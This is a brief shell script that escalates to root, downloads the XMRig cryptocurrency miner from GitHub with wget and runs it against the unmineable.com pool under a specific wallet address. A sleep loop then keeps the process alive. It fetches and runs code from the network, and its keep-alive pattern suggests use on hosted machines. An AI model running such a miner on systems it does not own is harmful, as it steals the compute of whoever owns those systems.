#!/bin/sh
sudo su 
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u KNC:0xDa4D2D822b2e6786f6aE19B3bC1d62A9aCdE90e5.cenemif892 -p x -k -a rx/0 --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
